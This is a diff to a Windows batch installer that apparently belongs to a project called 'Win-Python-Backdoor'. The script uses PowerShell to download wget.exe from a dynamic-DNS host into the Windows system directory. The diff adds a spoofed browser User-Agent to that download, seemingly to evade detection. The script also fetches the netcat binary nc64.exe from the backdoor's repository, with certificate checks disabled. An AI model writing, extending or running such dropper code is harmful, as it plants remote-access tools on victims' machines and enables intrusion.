@@ -37,7 +37,8 @@ set url=http://config02.addns.org
 set urlgit=https://github.com/pistacchietto/Win-Python-Backdoor/raw/master
 if "%PROCESSOR_ARCHITECTURE%"=="x86" goto 32BIT
 echo 64-bit OS
-%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wget.exe','%windir%\wget.exe')
+rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wget.exe','%windir%\wget.exe')
+%windir%\System32\cmd.exe /c powershell -command "$cli = New-Object System.Net.WebClient;$cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36';$cli.DownloadFile('%url%/win/wget.exe','%windir%\wget.exe')"
 wget --no-check-certificate %urlgit%/nc64.exe  -O %windir%\nc64.exe
 goto END
 :32BIT
